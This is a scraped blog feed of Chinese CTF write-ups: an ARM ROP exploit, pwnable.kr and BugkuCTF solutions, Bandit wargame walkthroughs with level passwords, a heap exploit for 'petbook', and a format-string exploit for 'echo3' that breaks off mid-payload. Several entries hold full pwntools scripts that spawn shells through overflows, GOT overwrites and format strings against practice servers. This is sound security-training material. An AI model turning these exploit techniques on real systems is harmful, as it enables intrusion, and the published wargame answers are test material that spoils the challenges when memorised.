lr; 0x0001db98: pop &#123;lr&#125;; b #0x11e38; mov r1, lr; pop &#123;lr&#125;; bx r3; 0x0001dba4: pop &#123;lr&#125;; bx r3; 0x00053ea8: pop &#123;pc&#125;; mov r0, #0; bx lr; 0x00050f30: pop &#123;pc&#125;; mov r0, r3; bx lr; 0x00053078: pop &#123;r0, r1, r2, r3, r4, lr&#125;; bx ip; 0x00053d64: pop &#123;r0, r1, r3, ip, lr&#125;; pop &#123;r2&#125;; ldr r1, [r0, #4]; bx r1; 0x00020904: pop &#123;r0, r4, pc&#125;; //选择的gadget 之后就是ROP就行了 exp: 123456789101112131415161718192021222324252627282930313233343536373839#!/usr/bin/env pythonfrom pwn import *local = 1debug = 0if local: p = remote("pwn2.jarvisoj.com","9888")elif debug: p = process(["qemu-arm", "-g", "1234", "-L", "arm-linux-gnueabihf", "typo"]) else: p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "typo"])elf = ELF("typo")libc = ELF("/usr/arm-linux-gnueabihf/lib/libc.so.6")context.binary = "typo"context.log_level = "debug"def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content) rc()sl('')payload = 'a'*112 + p32(0x00020904) + p32(0x0006c384) + p32(0) + p32(0x000110B4)rc()sl(payload)p.interactive() reference: 调用约定 M4x大佬博客 D4rk3r大佬博客]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ARM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.kr writeup]]></title>
    <url>%2F2018%2F10%2F06%2F2018-10-6-pwnable.kr-writeup%2F</url>
    <content type="text"><![CDATA[感觉pwnable.tw有点点难，还是先做pwnable.kr好了，writeup都会写在这篇文章里 bof这题给了二进制文件和源码 源码： 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key)&#123; char overflowme[32]; printf("overflow me : "); gets(overflowme); // smash me! if(key == 0xcafebabe)&#123; system("/bin/sh"); &#125; else&#123; printf("Nah..\n"); &#125;&#125;int main(int argc, char* argv[])&#123; func(0xdeadbeef); return 0;&#125; 一个简单的栈溢出，只要覆盖变量key为0xcafebabe 就会执行system函数 exp: 12345678from pwn import *p = remote('pwnable.kr',9000)offset = 0x2c+8payload = 'a'*offset +"\xbe\xba\xfe\xca"p.sendline(payload)p.interactive() flag这道题给了一个ELF文件，题目提示说这是一个打包过的礼物，可以猜测它加过壳。 用strings 打印下文件的可见字符串 1234567891011 $ strings flagUPX!@/x8gX lw_H/\_@ Kl$H9\$(t.....PROT_EXEC|PROT_WRITE failed.$Info: This file is packed with the UPX executable packer http://upx.sf.net $$Id: UPX 3.08 Copyright (C) 1996-2011 the UPX Team. All Rights Reserved. $ 可以看到程序加了upx壳，并且upx版本是3.08。先脱个壳 ，linux下用 upx -d 命令，然后拖到ida中反编译下 123456789int __cdecl main(int argc, const char **argv, const char **envp)&#123; char *dest; // ST08_8 puts("I will malloc() and strcpy the flag there. take it.", argv, envp); dest = (char *)malloc(100LL); strcpy(dest, flag); return 0;&#125; 可以看到程序逻辑很简单，它将flag复制到dest变量，所以可以在data段中找到flag]]></content>
      <categories>
        <category>CTF&#39;s writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Wargames--bandit 通关教程]]></title>
    <url>%2F2018%2F10%2F05%2F2018-10-5-Wargames--bandit-%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[这是一个让人熟悉linux操作的一个wargame，挺有意思的 网站 bandit0直接ssh连上去，cat readme 拿到下一关的密码 密码：boJ9jbbUNNfktd78OOpsqOltutMc3MY1 bandit1这一关它将密码藏在 - 文件中，以’-‘作为文件名，代表标准输入流或者标准输出流，要显示 ‘-‘文件的内容 需要用 cat ./- 来打印出来 密码：CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9 bandit2这关它将密码存在 spaces in this filename这个文件中，但是直接cat 的话不行，要在文件名左右加上”， 通过 cat “spaces in this filename”打印密码 密码：UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK bandit3进到inhere的目录下，ls发现没有东西。通过 ls -al 将隐藏的文件也显示出来，发现有个.hidden文件。在linux下文件名以.开头的都默认会隐藏起来。 通过 cat .hidden打印密码 密码：pIwrPrtPN36QITSp3EQaw936yaFoFgAB bandit4发现inhere中有好多个文件，文件名都以’-‘开头，所以不能直接 用cat命令+文件名，文件名前加./ 用file 命令查看目录下文件的类型，发现有个ASCII text和别的都不一样，密码就在这个文件里面 1234567891011121314151617bandit4@bandit:~$ lsinherebandit4@bandit:~$ cd inhere/bandit4@bandit:~/inhere$ ls-file00 -file02 -file04 -file06 -file08-file01 -file03 -file05 -file07 -file09bandit4@bandit:~/inhere$ file ./*./-file00: PGP\011Secret Key -./-file01: data./-file02: data./-file03: data./-file04: data./-file05: data./-file06: data./-file07: ASCII text./-file08: data./-file09: data 密码：koReBOKuIDDepwhWk7jZC0RTdopnAYKh bandit5题目给的提示： 12345The password for the next level is stored in a file somewhere under the inhere directory and has all of the following properties:human-readable1033 bytes in sizenot executable 进入inhere文件夹，可以发现有很多目录，结合题目给的提示，用find命令查找文件 123456find -type f -size 1033c-type设置查找文件的属性 f是普通文件-size指定查找的大小bandit5@bandit:~/inhere$ find -type f -size 1033c./maybehere07/.file2 密码：DXjZPULLxYr17uwoI01bNLQbtFemEgo7 bandit6题目提示 12345The password for the next level is stored somewhere on the server and has all of the following properties:owned by user bandit7owned by group bandit633 bytes in size 文件在服务器的某个位置，文件的用户是 bandit7 群组是 bandit6,大小为33c 用命令 1234find / -user bandit7 -group bandit6 -size 33c会出来一堆东西，但是又权限的只有/var/lib/dpkg/info/bandit7.password用cat将它内容打印出来 密码：HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs bandit7这关密码存在 data.txt中，并且密码在millionth这个单词后面，用grep命令 12grep millionth data.txtmillionth cvX2JJa4CFALtqS87jk27qwqGhBM9plV 密码：cvX2JJa4CFALtqS87jk27qwqGhBM9plV bandit8密码存储在data.txt中，并且只出现一次 用sort命令给data.txt的内容排序，同时用uniq命令忽略文件的重复行 123456sort data.txt | uniq -u -u 参数是只显示出现一次的行列bandit8@bandit:~$ sort data.txt | uniq -uUsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhRbandit8@bandit:~$ 密码：UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR bandit9密码存储在data.txt中，并且以几个 “===”开头 用strings 命令打印data.txt的可见字符，用grep命令筛选出包含 “===”的字符串 12345bandit9@bandit:~$ strings data.txt | grep "=="&lt;========== the?========== password*========== is:========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk 密码 ： truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk bandit10密码存储在data.txt中，并且被base64加密过，这里用到的命令是base64 12345base64用法：格式：base64 file从指定的文件file中读取数据，编码为base64字符串输出。格式：base64 -d file从标准输入中读取已经进行base64编码的内容，解码输出。 12bandit10@bandit:~$ base64 -d data.txt The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR 密码：IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR bandit11题目提示所有大小写字母位置都旋转了13个位置，这里用到了tr命令 12345678910111213141516171819202122232425tr 参数 前面的是原字符集，后面的是要替换的字符集-c或——complerment：取代所有不属于第一字符集的字符；-d或——delete：删除所有属于第一字符集的字符；-s或--squeeze-repeats：把连续重复的字符以单独一个字符表示；-t或--truncate-set1：先删除第一字符集较第二字符集多出的字符。tr能使用的字符类：[:alnum:]：字母和数字[:alpha:]：字母[:cntrl:]：控制（非打印）字符[:digit:]：数字[:graph:]：图形字符[:lower:]：小写字母[:print:]：可打印字符[:punct:]：标点符号[:space:]：空白字符[:upper:]：大写字母[:xdigit:]：十六进制字符用法：转换大小写：echo "HELLO WORLD" | tr 'A-Z' 'a-z'or echo "HELLO WORLD" | tr '[:upper:]' '[:lower:]' 这一题输入的命令 12bandit11@bandit:~$ cat data.txt | tr 'a-zA-Z' 'n-za-mN-ZA-M'The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu 密码：5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu bandit12未完待续]]></content>
      <categories>
        <category>wargames</category>
      </categories>
      <tags>
        <tag>bandit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BugkuCTF RE writeup]]></title>
    <url>%2F2018%2F10%2F04%2F2018-10-4-BugkuCTF-RE-writeup%2F</url>
    <content type="text"><![CDATA[最近想搞下逆向，就去刷了下BugkuCTF的逆向题 Easy_vb这是一道VB的逆向，下了个VB Decomoplier,反编译一下就可以看到flag了 easy_re拿ida打开文件，在比较语句那下个断点，动态调试，在内存中就可以看到flag了 123456789101112131415161718192021222324252627int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // eax __int128 v5; // [esp+0h] [ebp-44h] __int64 v6; // [esp+10h] [ebp-34h] int v7; // [esp+18h] [ebp-2Ch] __int16 v8; // [esp+1Ch] [ebp-28h] char v9; // [esp+20h] [ebp-24h] _mm_storeu_si128((__m128i *)&amp;v5, _mm_loadu_si128((const __m128i *)&amp;xmmword_11F3E34)); v7 = 0; v6 = qword_11F3E44; v8 = 0; printf("欢迎来到DUTCTF呦\n"); printf("这是一道很可爱很简单的逆向题呦\n"); printf("输入flag吧:"); scanf("%s", &amp;v9); v3 = strcmp((const char *)&amp;v5, &amp;v9);//在这下个断点 if ( v3 ) v3 = -(v3 &lt; 0) | 1; if ( v3 ) printf(aFlag_0); else printf((const char *)&amp;unk_11F3E90); system("pause"); return 0;&#125; 游戏过关这个就比较神奇，我拿到程序一顿瞎输，flag就出来了……. 只要依次输入 0-8,就可以看到flag了 Timer逆向入门拖到010editor中，发现是个base64，将它转换成图片会获得一个二维码，扫码得flag]]></content>
      <categories>
        <category>BugkuCTF RE writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[petbook writeup]]></title>
    <url>%2F2018%2F10%2F04%2F2018-10-3-petbook-writeup%2F</url>
    <content type="text"><![CDATA[防护机制： 1234567[*] '/home/zs0zrc/pwn/Scoreboard/petbook/petbook' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) FORTIFY: Enabled 开启了NX和Canary还有 FORTIFY FORTIFY是用来检测缓存区溢出的一个机制，感觉好像没什么用，详情参考这篇博客 逆出来的user结构体 123456789struct user&#123; int uid; char name[0x100]; char pwd[0x100]; int flag; char *petname; char *post;&#125;users; pet结构体 123456struct pet&#123; int uid; char *name; char *type;&#125;pet; //大致长这样 程序的功能有： register 创建用户 login 登陆 post edit post change password adopt pet rename pet abandon pet 程序的漏洞在于 register创建用户时，malloc的堆块未初始化，导致可以控制新创建的users的petname和post指针，可以通过post泄露信息，通过pet来实现任意地址写 1234567891011121314int __fastcall user_create(char *src, char *password)&#123; users *user; // rbp if ( user_find_by_name(src) ) return __printf_chk(1LL, "User %s existed!\n", src); user = malloc(0x218uLL); //漏洞所在，没有初始化 user-&gt;uid = uid(); strncpy(user-&gt;name, src, 0x100uLL); strncpy(user-&gt;password, password, 0x100uLL); user-&gt;flag = 0; link_insert(&amp;userdb, user); return puts("User created");&#125; 泄露信息：通过控制未初始化的user的pet指针，泄露信息 123456v4 = user-&gt;petname;if ( v4 )&#123; __printf_chk(1LL, &quot;= Pet Name: %s\n&quot;, *(v4 + 1)); __printf_chk(1LL, &quot;= Pet Type: %s\n&quot;, *(user-&gt;petname + 2));&#125; 任意地址写： 1234567891011121314151617181920212223int pet_rename()&#123; __int64 v0; // rbx _DWORD *v1; // rdx v0 = current_user; if ( (*current_user ^ magic) &amp; 0xFFFF0000 ) &#123; puts("corrupted object detected"); exit(1); &#125; v1 = *(current_user + 0x208); if ( !v1 ) return puts("You don't have a pet"); if ( (*v1 ^ magic) &amp; 0xFFFF0000 ) //这里要绕过这个检查，所以要将magic泄露出来 &#123; puts("corrupted object detected"); exit(1); &#125; puts("Name your pet &gt;&gt;"); read_data(*(*(v0 + 0x208) + 8LL), 16LL); return stripnl(*(*(v0 + 0x208) + 8LL));&#125; 利用思路： 1234先create一个用户，这个用户new一个大小大于0x218的post,然后编辑这个post，增加它的大小，使它原本的chunk被realloc函数free掉，放入unsortedbins中。这时再create一个用户，那么这个用户malloc申请的chunk就会从unsortedbin中的chunk切割下来，就可以控制这个用户的petname和post指针 具体步骤： 先创建一个用户’aaaa’,new一个post1,大小为0x230，将petname指针设置为userdb地址 - 0x10,然后编辑post1，使post1原本的chunk被relloca函数free掉 新建一个用户’bbbb’，泄露出堆地址 新建两个post，post2大小为0x100,post3大小为0x230，在post2中写入要泄露的地址，在post3中设置petname指针为post2的地址，post2的地址通过泄露的堆地址计算出来。通过控制 post2的内容，就可以泄露出想要的信息。 新建用户’cccc’,泄露出 magic和libc地址 new一个post4，将petname指针指向post2地址，然后编辑post4将原本的chunk free掉，新建一个用户’dddd’，用户’dddd’的petname指针就指向post2 伪造fake_magic，登陆用户’bbbb’，编辑post2内容为 p64(fake_magic)+p64(free_got) 登陆用户 ‘dddd’, 通过rename功能修改free_got为system函数 新建一个用户’ffff’, adopt一个pet ，name为’/bin/sh\x00’，再abandom掉就可调用system函数了 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116#!/usr/bin/env pythonfrom pwn import *local = 1context.log_level = 'debug'if local: p = process('./petbook') elf = ELF('./petbook') libc = elf.libcelse: host = 'hackme.inndy.tw' port = '7710' p = remote(host,port) elf = ELF('./petbook') libc = ELF('./libc-2.23.so.x86_64')def register(name,password): p.sendlineafter(" &gt;&gt;\n",'1') p.sendlineafter("Username &gt;&gt;\n",name) p.sendlineafter("Password &gt;&gt;\n",password)def login(name,password): p.sendlineafter(" &gt;&gt;\n",'2') p.sendlineafter("Username &gt;&gt;\n",name) p.sendlineafter("Password &gt;&gt;\n",password)def logout(): p.sendlineafter(" &gt;&gt;\n",'0')def post(title,size,content): p.sendlineafter(" &gt;&gt;\n",'1') p.sendlineafter("Title &gt;&gt;\n",title) p.sendlineafter("Content Length &gt;&gt;\n",str(size)) p.sendlineafter("Content &gt;&gt;\n",content)def edit_post(id,title,size,content): p.sendlineafter(" &gt;&gt;\n",'3') p.sendlineafter("Post id &gt;&gt;\n",str(id)) p.sendlineafter("New title &gt;&gt;\n",title) p.sendlineafter("New content size &gt;&gt;\n",str(size)) p.sendlineafter("Content &gt;&gt;\n",content) def adopt(name): p.sendlineafter(" &gt;&gt;\n",'5') p.sendlineafter("Name your pet &gt;&gt;\n",name)def rename(name): p.sendlineafter(" &gt;&gt;\n",'6') p.sendlineafter("Name your pet &gt;&gt;\n",name)def abandom(): p.sendlineafter(" &gt;&gt;\n",'7')payload1= 'a'*0x208 + p64(0x603158-0x10)*4register('aaaa','aaaa')login('aaaa','aaaa')post('1111',0x230,payload1) #post1edit_post(2,'1111',0x240,'bbbb')logout()register('bbbb','bbbb')login('bbbb','bbbb')log.info("leak heap address")p.recvuntil("Pet Type: ")leak_heap = u64(p.recvline().strip('\n').ljust(8,'\x00'))heap_base = leak_heap - 0x230log.info("leak heap_base address :&#123;&#125;".format(hex(heap_base)))fake_pet = heap_base + 0x940magic = 0x603164payload2 = 'a'*0x208 + p64(fake_pet)post('2222',0x100,p64(elf.got["puts"])*4) #uid = 4 post2post('3333',0x230,payload2) #uid = 5 post3edit_post(5,'2222',0x240,'2222')logout()register('cccc','cccc')login('cccc','cccc')p.recvuntil("Pet Name: ")leak_libc = u64(p.recvline().strip('\n').ljust(8,'\x00'))libc_base = leak_libc - libc.symbols['puts']libc.address = libc_basesystem = libc.symbols['system']log.info("libc address :&#123;&#125;".format(hex(libc_base)))logout()login('bbbb','bbbb')edit_post(4,'3333',0x100,p64(magic)*4)logout()login('cccc','cccc')p.recvuntil("Pet Name: ")leak_magic = u64(p.recvline().strip('\n').ljust(8,'\x00'))log.info("leak magic : &#123;&#125;".format(hex(leak_magic)))log.info("hjack free_got")fake_magic = leak_magic + 0x600000000payload3 = p64(fake_magic) + p64(elf.got['free'])payload4 = 'a'*0x208 + p64(fake_pet)post('aaaa',0x230,payload4) #uid = 7 post4edit_post(7,'1111',0x240,'aaaa')logout()register('dddd','dddd')login('bbbb','bbbb')edit_post(4,'1111',0x100,payload3)logout()login('dddd','dddd')rename(p64(system))logout()register('ffff','ffff')login('ffff','ffff')adopt('/bin/sh\x00')abandom()p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[echo3 writeup]]></title>
    <url>%2F2018%2F10%2F03%2F2018-10-2-echo3-writeup%2F</url>
    <content type="text"><![CDATA[防护机制： 123456[*] &apos;/home/zs0zrc/pwn/Scoreboard/echo3/echo3&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 这道题是echo 和echo2的升级版，也是一个格式化字符串漏洞，不过它将printf的格式化字符串放到了bss段上去了。一般来说格式化字符串在bss段的话，就要在栈上构造跳板，通过跳板实现任意地址写。具体点就是，找到栈上指向栈的指针，向指针写入got表地址，然后再通过这实现任意地址写 main函数 1234567891011121314151617181920212223int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; void *v3; // esp int fd; // [esp+14h] [ebp-1Ch] int buf; // [esp+18h] [ebp-18h] unsigned int v6; // [esp+24h] [ebp-Ch] int *v7; // [esp+28h] [ebp-8h] v7 = &amp;argc; v6 = __readgsdword(0x14u); setbuf(stdout, 0); fd = open("/dev/urandom", 0); if ( fd &lt; 0 ) &#123; puts("urandom error"); exit(1); &#125; read(fd, &amp;buf, 8u); read(fd, &amp;magic, 4u); close(fd); v3 = alloca(16 * (((buf &amp; 0x3039u) + 30) / 0x10));//它在这里做了一个抬栈的操作 hardfmt();&#125; 这里打开了/dev/urandom文件，读取了8个字节到buf中，读取了4个字节到magic中。并且它利用alloca函数，做了一个抬栈的操作，alloca函数的作用是分配内存，不过是向栈申请内存。在这里被用来抬栈，而且每次都是随机的，所以要先爆破一下，泄露出地址后才进行下一步 stack 的情况 随机抬高后的栈大部分就像这样子 1234567891011121314151617181920pwndbg&gt; stack 10000:0000│ esp 0xffffaf1c —▸ 0x804864b (hardfmt+133) ◂— add esp, 0x1001:0004│ 0xffffaf20 —▸ 0x804a080 (buff) ◂— 'aaaa\n'... ↓03:000c│ 0xffffaf28 ◂— 0x100004:0010│ 0xffffaf2c ◂— 0x005:0014│ 0xffffaf30 ◂— 'n,D*'06:0018│ 0xffffaf34 ◂— 0x0... ↓0c:0030│ 0xffffaf4c —▸ 0x80485d2 (hardfmt+12) ◂— add ebx, 0x1a2e0d:0034│ 0xffffaf50 ◂— 0x0... ↓0f:003c│ 0xffffaf58 —▸ 0xffffaf30 ◂— 'n,D*'10:0040│ 0xffffaf5c ◂— 0x519ab90011:0044│ 0xffffaf60 ◂— 0x012:0048│ 0xffffaf64 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f10 (_DYNAMIC) ◂— 0x113:004c│ ebp 0xffffaf68 —▸ 0xffffcfc8 ◂— 0x014:0050│ 0xffffaf6c —▸ 0x804877b (main+236) ◂— mov eax, 015:0054│ 0xffffaf70 ◂— 0x0... ↓ 这是我用到的栈情况,可以通过gdb调试，在alloca函数上下个断点，然后通过 set $eax=0x20来获得 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899pwndbg&gt; stack 10000:0000│ esp 0xffbf8a6c —▸ 0x804864b (hardfmt+133) ◂— add esp, 0x1001:0004│ 0xffbf8a70 —▸ 0x804a080 (buff) ◂— 0x35353325 ('%355')... ↓03:000c│ 0xffbf8a78 ◂— 0x100004:0010│ 0xffbf8a7c ◂— 0x105:0014│ 0xffbf8a80 ◂— 0x6c018c2e06:0018│ 0xffbf8a84 —▸ 0x804829c ◂— add byte ptr [ecx + ebp*2 + 0x62], ch07:001c│ 0xffbf8a88 —▸ 0xf77ec918 ◂— 0x008:0020│ 0xffbf8a8c ◂— 0x009:0024│ 0xffbf8a90 —▸ 0xffbf8ace ◂— 0x308040a:0028│ 0xffbf8a94 —▸ 0xf75fe018 ◂— stosd dword ptr es:[edi], eax0b:002c│ 0xffbf8a98 —▸ 0xf765321b (setbuffer+11) ◂— add ebx, 0x151de50c:0030│ 0xffbf8a9c —▸ 0x80485d2 (hardfmt+12) ◂— add ebx, 0x1a2e0d:0034│ 0xffbf8aa0 —▸ 0xf77d67eb (_dl_fixup+11) ◂— add esi, 0x158150e:0038│ 0xffbf8aa4 ◂— 0x10f:003c│ 0xffbf8aa8 —▸ 0xffbf8a80 ◂— 0x6c018c2e10:0040│ 0xffbf8aac ◂— 0x3b9d010011:0044│ 0xffbf8ab0 —▸ 0xffbf8b18 ◂— 0x012:0048│ 0xffbf8ab4 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f10 (_DYNAMIC) ◂— 0x113:004c│ ebp 0xffbf8ab8 —▸ 0xffbf8b18 ◂— 0x014:0050│ 0xffbf8abc —▸ 0x804877b (main+236) ◂— mov eax, 015:0054│ 0xffbf8ac0 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f10 (_DYNAMIC) ◂— 0x116:0058│ 0xffbf8ac4 —▸ 0x804a060 (magic) ◂— 0x6c018c2e //偏移为2117:005c│ 0xffbf8ac8 —▸ 0xf76c92ac (__close_nocancel+18) ◂— mov ebx, edx18:0060│ 0xffbf8acc —▸ 0x804874a (main+187) ◂— add esp, 0x1019:0064│ 0xffbf8ad0 ◂— 0x31a:0068│ 0xffbf8ad4 —▸ 0x804a060 (magic) ◂— 0x6c018c2e1b:006c│ 0xffbf8ad8 ◂— 0x41c:0070│ 0xffbf8adc —▸ 0x80486a6 (main+23) ◂— add ebx, 0x195a1d:0074│ 0xffbf8ae0 ◂— 0x80001e:0078│ 0xffbf8ae4 —▸ 0xf77a5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db01f:007c│ 0xffbf8ae8 —▸ 0xffbf8bcc —▸ 0xffbfa2ba ◂— 0x515f5451 ('QT_Q') //这是选择的跳板20:0080│ 0xffbf8aec —▸ 0xffbf8bc4 —▸ 0xffbfa2b2 ◂— './echo3' //21:0084│ 0xffbf8af0 ◂— 0x122:0088│ 0xffbf8af4 ◂— 0x023:008c│ 0xffbf8af8 —▸ 0xffbf8bcc —▸ 0xffbfa2ba ◂— 0x515f5451 ('QT_Q')24:0090│ 0xffbf8afc ◂— 0x325:0094│ 0xffbf8b00 ◂— 0x6771084c26:0098│ 0xffbf8b04 ◂— 0xedf6843527:009c│ 0xffbf8b08 —▸ 0xffbf8bcc —▸ 0xffbfa2ba ◂— 0x515f5451 ('QT_Q')28:00a0│ 0xffbf8b0c ◂— 0x3b9d010029:00a4│ 0xffbf8b10 —▸ 0xffbf8b30 ◂— 0x12a:00a8│ 0xffbf8b14 ◂— 0x0... ↓2c:00b0│ 0xffbf8b1c —▸ 0xf760b637 (__libc_start_main+247) ◂— add esp, 0x102d:00b4│ 0xffbf8b20 —▸ 0xf77a5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0... ↓2f:00bc│ 0xffbf8b28 ◂— 0x030:00c0│ 0xffbf8b2c —▸ 0xf760b637 (__libc_start_main+247) ◂— add esp, 0x1031:00c4│ 0xffbf8b30 ◂— 0x132:00c8│ 0xffbf8b34 —▸ 0xffbf8bc4 —▸ 0xffbfa2b2 ◂— './echo3'33:00cc│ 0xffbf8b38 —▸ 0xffbf8bcc —▸ 0xffbfa2ba ◂— 0x515f5451 ('QT_Q')34:00d0│ 0xffbf8b3c ◂— 0x0... ↓37:00dc│ 0xffbf8b48 —▸ 0xf77a5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db038:00e0│ 0xffbf8b4c —▸ 0xf77ecc04 ◂— 0x039:00e4│ 0xffbf8b50 —▸ 0xf77ec000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x23f3c3a:00e8│ 0xffbf8b54 ◂— 0x03b:00ec│ 0xffbf8b58 —▸ 0xf77a5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0... ↓3d:00f4│ 0xffbf8b60 ◂— 0x03e:00f8│ 0xffbf8b64 ◂— 0xc11ec0133f:00fc│ 0xffbf8b68 ◂— 0x7f634e0240:0100│ 0xffbf8b6c ◂— 0x0... ↓43:010c│ 0xffbf8b78 ◂— 0x144:0110│ 0xffbf8b7c —▸ 0x80484b0 (_start) ◂— xor ebp, ebp45:0114│ 0xffbf8b80 ◂— 0x046:0118│ 0xffbf8b84 —▸ 0xf77dd010 (_dl_runtime_resolve+16) ◂— pop edx47:011c│ 0xffbf8b88 —▸ 0xf77d7880 (_dl_fini) ◂— push ebp48:0120│ 0xffbf8b8c —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f10 (_DYNAMIC) ◂— 0x149:0124│ 0xffbf8b90 ◂— 0x14a:0128│ 0xffbf8b94 —▸ 0x80484b0 (_start) ◂— xor ebp, ebp4b:012c│ 0xffbf8b98 ◂— 0x04c:0130│ 0xffbf8b9c —▸ 0x80484e2 (_start+50) ◂— hlt 4d:0134│ 0xffbf8ba0 —▸ 0x804868f (main) ◂— lea ecx, [esp + 4]4e:0138│ 0xffbf8ba4 ◂— 0x14f:013c│ 0xffbf8ba8 —▸ 0xffbf8bc4 —▸ 0xffbfa2b2 ◂— './echo3'50:0140│ 0xffbf8bac —▸ 0x80487a0 (__libc_csu_init) ◂— push ebp51:0144│ 0xffbf8bb0 —▸ 0x8048800 (__libc_csu_fini) ◂— ret 52:0148│ 0xffbf8bb4 —▸ 0xf77d7880 (_dl_fini) ◂— push ebp53:014c│ 0xffbf8bb8 —▸ 0xffbf8bbc —▸ 0xf77ec918 ◂— 0x054:0150│ 0xffbf8bbc —▸ 0xf77ec918 ◂— 0x055:0154│ 0xffbf8bc0 ◂— 0x156:0158│ 0xffbf8bc4 —▸ 0xffbfa2b2 ◂— './echo3' //偏移为8557:015c│ 0xffbf8bc8 ◂— 0x058:0160│ 0xffbf8bcc —▸ 0xffbfa2ba ◂— 0x515f5451 ('QT_Q') //偏移为8759:0164│ 0xffbf8bd0 —▸ 0xffbfa2db ◂— 0x5f474458 ('XDG_')5a:0168│ 0xffbf8bd4 —▸ 0xffbfa30d ◂— 0x4d4f4e47 ('GNOM')5b:016c│ 0xffbf8bd8 —▸ 0xffbfa339 ◂— 0x435f434c ('LC_C')5c:0170│ 0xffbf8bdc —▸ 0xffbfa34e ◂— 0x5f474458 ('XDG_')5d:0174│ 0xffbf8be0 —▸ 0xffbfa368 ◂— 0x5f474458 ('XDG_')5e:0178│ 0xffbf8be4 —▸ 0xffbfa37d ◂— 0x495f5451 ('QT_I')5f:017c│ 0xffbf8be8 —▸ 0xffbfa38f ◂— 'LOGNAME=zs0zrc'60:0180│ 0xffbf8bec —▸ 0xffbfa39e ◂— 'USER=zs0zrc'61:0184│ 0xffbf8bf0 —▸ 0xffbfa3aa ◂— 0x48544150 ('PATH')62:0188│ 0xffbf8bf4 —▸ 0xffbfa43b ◂— 'XDG_VTNR=7'63:018c│ 0xffbf8bf8 —▸ 0xffbfa446 ◂— 0x4d4f4e47 ('GNOM') 先爆破，泄露出libc地址和栈的地址 12345678910111213141516while True: p = process('./echo3') payload = '%43$p#%30$p' p.sendline(payload) data = p.recvuntil('#',drop = True) if data[-3:] == '637': break p.close()leak_libc = int(data,16) - 247libc_base = leak_libc - libc.symbols['__libc_start_main']log.info("libc address &#123;&#125;".format(hex(libc_base)))leak_stack = int(p.recv().strip('\n'),16)log.info("leak stack address&#123;&#125;".format(hex(leak_stack)))stack1 = leak_stack - 0x10cstack2 = leak_stack - 0x108 因为格式化字符串在bss段上，所以先要在栈上找到指向栈的指针，这里用到的是 121f:007c│ 0xffbf8ae8 —▸ 0xffbf8bcc —▸ 0xffbfa2ba ◂— 0x515f5451 ('QT_Q')20:0080│ 0xffbf8aec —▸ 0xffbf8bc4 —▸ 0xffbfa2b2 ◂— './echo3' 修改为 121f:007c│ 0xffbf8ae8 —▸ 0xffbf8bcc —▸0x804a000 (_GLOBAL_OFFSET_TABLE_)20:0080│ 0xffbf8aec —▸ 0xffbf8bc4 —▸0x804a060 (magic) payload: 123payload1 = "%&#123;&#125;c%&#123;&#125;$hn".format(stack1 &amp; 0xffff, 30)payload1 += "%&#123;&#125;c%&#123;&#125;$hn".format(4, 31)payload1 += '1111' 这时再通过修改0xffbf8bcc和0xffbf8bc4 的内容为 print_got和printf_got+2 1232:00c8│ 0xffbf8b34 —▸ 0xffbf8bc4 —▸ 0xffbf8ac4 —▸ 0x804a01433:00cc│ 0xffbf8b38 —▸ 0xffbf8bcc —▸ 0xffbf8ac0 —▸ 0x804a016 payload: 123payload2 = "%&#123;&#125;c%&#123;&#125;$hn".format(printf_got &amp; 0xffff, 85)payload2 += "%&#123;&#125;c%&#123;&#125;$hn".format(2, 87)payload2 += "2222" 最后向printf_got中写入system函数地址，发送’/bin/sh\x00’字符串，getshell payload: 123payload3 = "%&#123;&#125;c%&#123;&#125;$hhn".format(system&gt;&gt; 16 &amp; 0xff, 20)payload3 += "%&#123;&#125;c%&#123;&#125;$hn".format((system&amp; 0xffff) - (system &gt;&gt; 16 &amp; 0xff), 